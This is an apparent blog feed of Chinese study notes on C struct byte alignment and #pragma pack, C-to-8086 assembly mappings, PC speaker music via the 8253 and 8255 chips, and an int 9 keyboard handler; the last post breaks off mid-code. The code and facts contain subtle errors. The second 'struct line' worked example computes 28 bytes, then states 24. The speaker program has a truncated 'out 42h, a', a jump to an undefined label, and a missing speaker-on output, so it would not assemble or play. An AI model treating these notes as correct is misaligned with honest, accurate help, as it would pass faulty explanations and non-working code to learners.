      <link href="/2024/03/26/%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90/"/>
      <url>/2024/03/26/%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90/</url>
      
        <content type="html"><![CDATA[<h1 id="字节对齐"><a href="#字节对齐" class="headerlink" title="字节对齐"></a>字节对齐</h1><p><strong>成员变量的位置(偏移量)必须是其宽度的整数倍；整个结构体的宽度取决于其成员变量宽度的最大值。</strong></p><p>什么是字节对齐，这里不多说。为什么要字节对齐，大概是能够提高CPU存储变量的速度，这里也不多说。但是可以肯定的是，字节对齐是编译器的行为，凭这一点就决定了我们需要掌握它。</p><p>首先，需要先定义两个概念：</p><ol><li><strong>变量的偏移量</strong>：所谓变量的偏移量其实是成员变量的起始地址相对于结构体的起始地址的偏移量。<u>决定了结构体的内部细节</u>。</li><li><strong>结构体的字节边界数</strong>：即该结构体中最大的变量类型所占用的字节数。<u>决定了结构体的整体宽度</u>。</li></ol><p>编译器决定结构体所占用的内存大小也是基于上面两个概念，有了下面两个规则：</p><ol><li>成员变量的地址偏移量必须为该变量类型的大小的整数倍。</li><li>最终形成的结构体的大小必须为该结构体的字节边界数的整数倍。</li></ol><p>查看下面这个结构体，其<code>sizeof(struct point)</code>会是多大呢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">   <span class="type">double</span> x; </span><br><span class="line">   <span class="type">char</span> y; </span><br><span class="line">   <span class="type">int</span> z; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>答案是<code>16</code>。<code>x</code>占<code>8</code>个字节，这时偏移量为<code>0</code>，<code>0</code>是<code>8</code>的倍数，满足条件可以放；<code>y</code>占<code>1</code>个字节，这时偏移量为<code>9</code>，<code>9</code>是<code>1</code>的倍数，满足条件可以放；<code>z</code>占<code>4</code>个字节，这时偏移量为<code>9</code>，<code>9</code>不是<code>4</code>的倍数，不满足条件，此时<code>z</code>不能直接放，需要在<code>y</code>后面填充<code>3</code>个无效字节，使得偏移量变为<code>12</code>，这时满足条件可以放<code>z</code>。此时，结构体的大小为<code>8 + 1 + 3 + 4 = 16</code>，且字节边界数的大小是<code>double</code>的大小<code>8</code>，也满足。所以最终结构体的大小就是<code>16</code></p><p>再看看下面这个结构体的大小会是多少，只是上面的结构体中的两个成员变量变换了一下顺序而已。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">   <span class="type">char</span> y;</span><br><span class="line">   <span class="type">double</span> x; </span><br><span class="line">   <span class="type">int</span> z; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>答案是<code>24</code>。同样来分析一下。<code>y</code>占<code>1</code>个字节，这时其偏移量为<code>0</code>，满足条件；<code>x</code>占<code>8</code>个字节，这时其偏移量为<code>1</code>，不满足条件，所以需要在<code>y</code>后面补足<code>7</code>个无效字节，这时其偏移量为<code>8</code>，满足条件；<code>z</code>占<code>4</code>个字节，这时其偏移量为<code>16</code>，满足条件。这时结构体的大小为<code>1 + 7 + 8 + 4 = 20</code>个字节，但是结构体的字节边界数<code>8</code>，<code>20</code>不是<code>8</code>的倍数，还需要在<code>z</code>的后面补足<code>4</code>个字节。所以，最终结构体的大小为<code>24</code>。</p><hr><p>讲到这里，用上面的方法解释基本类型组成的结构体还是可以的。但是涉及到结构的成员变量有结构体呢，上述的方法又有些行不通了。这说明上面的解释还不够笼统和精确（<del>上面讲的当废话好了</del>。学到后面，需要提出一个新的概念：<strong>成员变量的对齐参数</strong>。这个概念的使用还是会需要用到上面说的<strong>偏移量</strong>，但是字节边界数可能就不需要了。</p><p>会什么要强调成员变量，因为这个对齐参数是作用于成员变量的。</p><p>结构体中的每个成员变量会有其<strong>对齐参数</strong>（<strong>成员变量的宽度</strong>），而这个对齐参数来源于：<strong>默认对齐参数</strong> 和 <strong>指定对齐参数</strong>。成员变量的对齐参数需要从这两个参数中选择，选择的方式也很简单：哪个小选哪个。一般来说，基本变量类型的默认对齐参数就是其大小，而结构体变量类型的默认对齐参数则是从其所有成员变量的对齐参数中选择最大的那一个；指定对齐参数会在后面再解释。</p><p>从这个新的概念出发，结构体的构造有了下面新的规则：</p><ol><li><strong>从结构体的局部性来看，成员变量的地址偏移量必须是其对齐参数的整数倍，不够的话补足无效字节</strong>。<u>决定了结构体的内部细节</u>。</li><li><strong>从结构体的整体性来看，最终结构体的大小必须是所有成员变量的对齐参数的整数倍，或者说最小公因数，不够的话在结尾补足无效字节</strong>。<u>决定了结构体的整体宽度</u>。</li></ol><p>分析一下下面的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">   <span class="type">char</span> x;</span><br><span class="line">   <span class="type">double</span> y; </span><br><span class="line">   <span class="type">int</span> z; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">line</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">point</span> <span class="title">p</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>先看一下<code>struct point</code>，对<code>x</code>来说，其对齐参数为<code>sizeof(char) = 1</code>，此时偏移量为<code>0</code>，偏移量是对齐参数的整数倍；对<code>y</code>来说，其对齐参数为<code>8</code>，此时偏移量为<code>1</code>，不满足条件，先在<code>x</code>后面补足<code>7</code>个字节使得<code>y</code>的偏移量为<code>8</code>，这样<code>y</code>的偏移量就是其对齐参数的整数倍了；对<code>z</code>来说，其对齐参数为<code>4</code>，此时偏移量为<code>16</code>，满足条件，直接放。此时结构体的大小为<code>1 + 7 + 8 + 4 = 20</code>个字节，不是所有对齐参数（x 1，y 8，z 4）的最小公倍数，所以还需再补足<code>4</code>个字节。由此，最终结构体的大小为<code>24</code>。</p><p>同时，还能得出<code>struct point</code>的默认对齐参数为其所有成员变量的对齐参数的最大值，也就是<code>y</code>的对齐参数<code>8</code>。</p><p>再看一下<code>struct line</code>，对<code>a</code>来说，其对齐参数为<code>sizeof(int) = 4</code>，此时偏移量为<code>0</code>，满足条件；对<code>p</code>来说，其对齐参数为<code>8</code>，此时的偏移量为<code>4</code>不满足条件，再补足<code>4</code>个字节，偏移量变成<code>8</code>。于是，结构体的大小为<code>4 + 4 + 24 = 32</code>，也同时满足了最小公倍数的条件。所以，最终结构体的大小为<code>32</code>了。</p><p>上面的例子中还没有添加<strong>指定对齐参数</strong>，而添加指定对齐参数的方法就是添加预处理指令<code>#pragma pack(n)</code>，有了这条指令后，下面代码的指定对齐参数都为<code>n</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(4) <span class="comment">// 指定对齐参数为4</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">   <span class="type">char</span> x;</span><br><span class="line">   <span class="type">double</span> y;</span><br><span class="line">   <span class="type">int</span> z;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>前面说过，一个成员变量的对齐参数为<code>min{默认对齐参数, 指定对齐参数}</code></p><p>这样的话，对<code>x</code>来说，其默认对齐参数为<code>1</code>而指定对齐参数为<code>4</code>，选择小的那个，<code>x</code>的对齐参数为<code>1</code>。对<code>y</code>来说，默认对齐参数为<code>8</code>，指定对齐参数为<code>4</code>，所以选择指定对齐参数<code>4</code>为其对齐参数。而此时偏移量为<code>1</code>，先在<code>x</code>后面补足<code>3</code>个字节，让<code>y</code>的偏移量变为<code>4</code>。<code>z</code>的默认对齐参数为<code>4</code>，指定对齐参数也为<code>4</code>，对齐参数选哪个都行反正为<code>4</code>，此时偏移量为<code>12</code>，也满足条件，放上就行。此时结构体的大小为<code>1 + 3 + 8 + 4 = 16</code>，满足公倍数条件（x 的对齐参数为 1，y 的对齐参数为 4，z 的对齐参数为 4）。最终结构体的大小就为<code>16</code>了。</p><p>同时也可以得出<code>struct point</code>的默认对齐参数为<code>4</code>，所有成员变量的对齐参数中最大的那个。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(4) <span class="comment">// 指定对齐参数为4</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">point</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">   <span class="type">char</span> x;</span><br><span class="line">   <span class="type">double</span> y;</span><br><span class="line">   <span class="type">int</span> z;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">line</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> a;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">point</span> <span class="title">p</span>;</span></span><br><span class="line">    <span class="type">double</span> b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后基于此分析一下<code>struct line</code>。</p><p><code>a</code>的默认对齐参数为<code>1</code>，指定对齐参数为<code>4</code>，所以其对齐参数为<code>1</code>，此时偏移量为<code>0</code>，满足条件；<br><code>p</code>的默认对齐参数为<code>4</code>，指定对齐参数为<code>4</code>，所以对齐参数为<code>4</code>，偏移量为<code>1</code>，不满足条件，先在<code>a</code>后面补足<code>3</code>个字节然后放入。<br><code>b</code>的默认对齐参数为<code>8</code>，指定对齐参数为<code>4</code>，所以对齐参数为<code>4</code>，偏移量为<code>20</code>，满足对齐参数是偏移量整数倍的条件，所以可以放入不用补足字节<br>此时，结构体的大小为<code>1 + 3 + 16 + 8 = 28</code>个字节，所有对齐参数为<code>1 4 4</code>，也满足公倍数条件，不用在结尾补足字节，所以可以确定最终结构体大小为<code>24</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】C与汇编</title>
      <link href="/2024/03/18/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91C%E4%B8%8E%E6%B1%87%E7%BC%96/"/>
      <url>/2024/03/18/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91C%E4%B8%8E%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<p>编写好的<strong>main</strong>函数的地址总是在<code>CS:01FA</code>或者说<code>076A:01FA</code>处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">* (char *) 0x2000 = &#x27;a&#x27;;</span><br><span class="line">mov byte ptr [2000], 61</span><br><span class="line"></span><br><span class="line">* (int *) 0x2000 = 0xf;</span><br><span class="line">mov word ptr [2000], 0000f</span><br><span class="line"></span><br><span class="line">* (char far *) 0x20001000 = &#x27;a&#x27;;</span><br><span class="line">mov bx, 2000</span><br><span class="line">mov es, bx</span><br><span class="line">mov bx, 1000</span><br><span class="line">mov byte ptr es:[bx], 61</span><br><span class="line"></span><br><span class="line">* (char *) _AX = &#x27;b&#x27;;</span><br><span class="line">mov bx, ax</span><br><span class="line">mov abyte ptr [bx], 62</span><br><span class="line"></span><br><span class="line">_BX = 0x1000;</span><br><span class="line">* (char *) (_BX + _BX) = &#x27;a&#x27;;</span><br><span class="line">mov bx, 1000</span><br><span class="line">add bx, bx</span><br><span class="line">mov byte ptr [bx], 61</span><br><span class="line"></span><br><span class="line">* (char far *) (0x20001000 + _BX) = * (char *)_AX;</span><br><span class="line">mov bx, ax</span><br><span class="line">mov al, [bx]</span><br><span class="line">xor cx, cx</span><br><span class="line">add bx, 1000</span><br><span class="line">adc cx, 2000</span><br><span class="line">mov es, cx</span><br><span class="line">mov es:[bx], al</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】让计算机唱歌</title>
      <link href="/2024/03/17/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E8%AE%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%94%B1%E6%AD%8C/"/>
      <url>/2024/03/17/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E8%AE%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%94%B1%E6%AD%8C/</url>
      
        <content type="html"><![CDATA[<p>决定一个声音的因素有两个：频率和持续时间</p><p>在这次示例中用 2 个芯片来分别控制这两个因素，分别为：**8253芯片 **和 <strong>8255芯片</strong></p><h3 id="8253芯片-定时-计数器-的设置"><a href="#8253芯片-定时-计数器-的设置" class="headerlink" title="8253芯片(定时&#x2F;计数器)的设置"></a>8253芯片(定时&#x2F;计数器)的设置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0B6H ; 8253初始化，固定值</span><br><span class="line">out 43h, al ; 43H是8253芯片控制口的端口地址</span><br><span class="line">mov dx, 12h ; 被除数高位，固定值</span><br><span class="line">mov ax, 34DCh ; 被除数低位，固定值</span><br><span class="line"></span><br><span class="line">div word ptr [si] ; 计算分频值，赋值给ax，[si]存放声音的频率，变量</span><br><span class="line"></span><br><span class="line">out 42h, al ; 先送低8位到计数器，42h是8253芯片通道2的端口地址</span><br><span class="line">mov al, ah  </span><br><span class="line">out 42h, al ; 后送高8位，分两次传送</span><br></pre></td></tr></table></figure><h3 id="8255芯片-并行I-O-的设置，控制扬声器的开-关"><a href="#8255芯片-并行I-O-的设置，控制扬声器的开-关" class="headerlink" title="8255芯片(并行I&#x2F;O)的设置，控制扬声器的开&#x2F;关"></a>8255芯片(并行I&#x2F;O)的设置，控制扬声器的开&#x2F;关</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">in al, 61h ; 读取8255 B端口的原值</span><br><span class="line">mov ah, al ; 移到高8位，保存原来端口的值</span><br><span class="line">or al, 0011b ; 使低 2 位置1，以便打开开关</span><br><span class="line">out 61h, al ; 开扬声器，发生</span><br><span class="line">...... ; 延时，保持时间</span><br><span class="line">mov al, ah ; 高8位移到低8位</span><br><span class="line">out 61h, al; 恢复扬声器端口原值</span><br></pre></td></tr></table></figure><p>音符和发音频率(Hz)的对应关系：</p><table><thead><tr><th align="center">低音符</th><th align="center">频率</th><th align="center">中音符</th><th align="center">频率</th><th align="center">高音符</th><th align="center">频率</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">138</td><td align="center">1</td><td align="center">262</td><td align="center">1</td><td align="center">524</td></tr><tr><td align="center">2</td><td align="center">147</td><td align="center">2</td><td align="center">294</td><td align="center">2</td><td align="center">587</td></tr><tr><td align="center">3</td><td align="center">165</td><td align="center">3</td><td align="center">330</td><td align="center">3</td><td align="center">659</td></tr><tr><td align="center">4</td><td align="center">175</td><td align="center">4</td><td align="center">349</td><td align="center">4</td><td align="center">698</td></tr><tr><td align="center">5</td><td align="center">196</td><td align="center">5</td><td align="center">392</td><td align="center">5</td><td align="center">784</td></tr><tr><td align="center">6</td><td align="center">220</td><td align="center">6</td><td align="center">440</td><td align="center">6</td><td align="center">880</td></tr><tr><td align="center">7</td><td align="center">247</td><td align="center">7</td><td align="center">494</td><td align="center">7</td><td align="center">988</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codeseg, ds:dataseg, ss:stackseg</span><br><span class="line">dataseg segment</span><br><span class="line">mus_freq dw 262,262,262,196,330,330,330,262</span><br><span class="line">dw 262,330,392,392,349,330,294</span><br><span class="line">dw 294,330,349,349,330,294,330,262</span><br><span class="line">dw 262,330,294,196,247,294,262,-1</span><br><span class="line">mus_time dw 3 dup(12,12,25,25),12,12,50</span><br><span class="line">dw 3 dup(12,12,25,25),12,12,50</span><br><span class="line">dataseg ends</span><br><span class="line">stackseg segment</span><br><span class="line">db 100h dup (0)</span><br><span class="line">stackseg ends</span><br><span class="line">codeseg segment</span><br><span class="line">start:</span><br><span class="line">mov ax, stackseg</span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, 100h</span><br><span class="line">mov ax, dataseg</span><br><span class="line">mov ds, ax</span><br><span class="line">lea si, mus_freq</span><br><span class="line">lea di, mus_time</span><br><span class="line">play:</span><br><span class="line">mov dx, [si]</span><br><span class="line">cmp dx, -1</span><br><span class="line">je end_play</span><br><span class="line">call sound</span><br><span class="line">add si, 2</span><br><span class="line">add di, 2</span><br><span class="line">jmp play</span><br><span class="line">end_play:</span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">sound:</span><br><span class="line">push ax</span><br><span class="line">push dx</span><br><span class="line">push cx</span><br><span class="line">mov al,0b6h</span><br><span class="line">; 8253芯片设置</span><br><span class="line">out 43h,al</span><br><span class="line">mov dx,12h</span><br><span class="line">mov ax,34dch</span><br><span class="line">div word ptr [si]</span><br><span class="line">out 42h, al</span><br><span class="line">mov al, ah</span><br><span class="line">out 42h, a</span><br><span class="line">;设置8255芯片, 控制扬声器的开/关</span><br><span class="line">in al,61h</span><br><span class="line">mov ah,al</span><br><span class="line">or al,3</span><br><span class="line">;延时</span><br><span class="line">mov dx, [di]</span><br><span class="line">wait1:</span><br><span class="line">mov cx, 28000</span><br><span class="line">delay:</span><br><span class="line">nop</span><br><span class="line">loop delay</span><br><span class="line">dec dx</span><br><span class="line">jnz wait</span><br><span class="line">;恢复扬声器端口原值</span><br><span class="line">mov al, ah</span><br><span class="line">out 61h, al</span><br><span class="line"></span><br><span class="line">pop cx</span><br><span class="line">pop dx</span><br><span class="line">pop ax</span><br><span class="line">ret</span><br><span class="line">codeseg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】PC机键盘的处理过程</title>
      <link href="/2024/03/16/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91PC%E6%9C%BA%E9%94%AE%E7%9B%98%E7%9A%84%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B/"/>
      <url>/2024/03/16/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91PC%E6%9C%BA%E9%94%AE%E7%9B%98%E7%9A%84%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>键盘输入的处理过程大致分为以下三个步骤：</p><ol><li>键盘输入</li><li>引发9号中断</li><li>执行int 9中断例程</li></ol><h3 id="键盘输入"><a href="#键盘输入" class="headerlink" title="键盘输入"></a>键盘输入</h3><p>键盘按下一个键时，键盘的芯片会产生对应的 <strong>扫描码</strong>，送入计算机与键盘的接口的寄存器中，这个接口在这次示例中地址为 60H<br>按键的松开也会产生一个 <strong>扫描码</strong>，相同的处理</p><p>扫描码根据被按下产生和松开产生分为 <strong>通码</strong> 和 <strong>断码</strong> ，同一个按键的通码的第8位为0，断码的第8位为1<br>一个扫描码的大小似乎为 1 个字节，也就是说同一按键，断码 &#x3D; 通码 + 80H<br>例：g键的通码为 22H，断码为 A2H</p><h3 id="引发中断"><a href="#引发中断" class="headerlink" title="引发中断"></a>引发中断</h3><p>键盘的输入到达 60H端口之后，相关的芯片会向CPU发送<strong>可屏蔽中断信号</strong>，这个中断的类型码为 <strong>9</strong></p><p>CPU在执行完一条指令后，如果 IF &#x3D; 1，就会检测是否有中断信息，有，则响应中断，引发中断过程，转去执行int 9中断例程</p><h3 id="执行中断例程"><a href="#执行中断例程" class="headerlink" title="执行中断例程"></a>执行中断例程</h3><blockquote><p>在了解之前，我们需要先知道输入的字符键值如何保存？<br>在BIOS中有一个键盘缓冲区，这是系统启动后，BIOS用于存放int 9 中断例程所接收的键盘输入的内存区。在这个缓冲区可以存储 15 个键盘输入，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放 ASCII码。<br>与一般字符键不同的是，控制键和切换键并不存放在BIOS缓冲区。它们存储在专门的地址 <strong>0040:17</strong> 中，这个地址被称为<strong>键盘状态字节</strong></p><table><thead><tr><th align="center">7</th><th align="center">6</th><th align="center">5</th><th align="center">4</th><th align="center">3</th><th align="center">2</th><th align="center">1</th><th align="center">0</th></tr></thead><tbody><tr><td align="center">Insert</td><td align="center">CapsLock</td><td align="center">NumLock</td><td align="center">ScrollLock</td><td align="center">Alt</td><td align="center">Ctrl</td><td align="center">左shift</td><td align="center">右shift</td></tr></tbody></table></blockquote><p>CPU响应9号中断就会执行int 9中断例程：</p><ol><li>读出60H端口中的扫描码，根据扫描码类型做不同处理</li><li>如果是字符键的扫描码，将该扫描码和它所对应的ASCII码送入内存中的BIOS键盘缓冲区<br> 如果是控制键（比如 Ctrl ）和切换键（比如CapsLock）的扫描码，则将其转变为状态字节，写入内存中存储状态字节的单元</li><li>做一些扫除工作，中断返回</li></ol><hr><p>前面 2 个过程由硬件自动完成，我们能够操作就是在第3步，也就是根据自己的需求去定制中断的处理过程，处理键盘的输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data, ss:stack</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 128 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">dw 0, 0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax, stack</span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, 128</span><br><span class="line"></span><br><span class="line">mov ax, data</span><br><span class="line">mov ds, ax</span><br><span class="line"></span><br><span class="line">mov ax, 0</span><br><span class="line">mov es, ax</span><br><span class="line"></span><br><span class="line">push es:[9*4]</span><br><span class="line">pop ds:[0]</span><br><span class="line">push es:[9*4+2]</span><br><span class="line">pop ds:[2]</span><br><span class="line"></span><br><span class="line">mov word ptr es:[9*4], offset int9</span><br><span class="line">mov es:[9*4+2], cs</span><br><span class="line"></span><br><span class="line">mov ax, 0B800H</span><br><span class="line">mov es, ax</span><br><span class="line">mov ah, &#x27;a&#x27;</span><br><span class="line"> s: mov es:[160*12+40*2], ah</span><br><span class="line"> call delay</span><br><span class="line"> inc ah</span><br><span class="line"> cmp ah, &#x27;z&#x27;</span><br><span class="line"> jna s</span><br><span class="line"></span><br><span class="line"> mov ax, 0</span><br><span class="line"> mov es, ax</span><br><span class="line"></span><br><span class="line"> push ds:[0]</span><br><span class="line"> pop es:[9*4]</span><br><span class="line"> push ds:[2]</span><br><span class="line"> pop es:[9*4+2]</span><br><span class="line"></span><br><span class="line"> mov ax, 4c00H</span><br><span class="line"> int 21h</span><br><span class="line"></span><br><span class="line">delay:</span><br><span class="line">push ax</span><br><span class="line">push dx</span><br><span class="line">mov dx, 5H</span><br><span class="line">mov ax, 0</span><br><span class="line"> s1:sub ax, 1</span><br><span class="line"> sbb dx, 0</span><br><span class="line"> cmp ax, 0</span><br><span class="line"> jne s1</span><br><span class="line"> cmp dx, 0</span><br><span class="line"> jne s1</span><br><span class="line">pop dx</span><br><span class="line">pop ax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">int9:</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">push es</span><br><span class="line"></span><br><span class="line">in al, 60H</span><br><span class="line"></span><br><span class="line">pushf</span><br><span class="line">pushf</span><br><span class="line">pop bx</span><br><span class="line">and bh, 11111100b</span><br><span class="line">push bx</span><br><span class="line">popf</span><br><span class="line">call dword ptr ds:[0]</span><br><span class="line"></span><br><span class="line">cmp al, 1</span><br><span 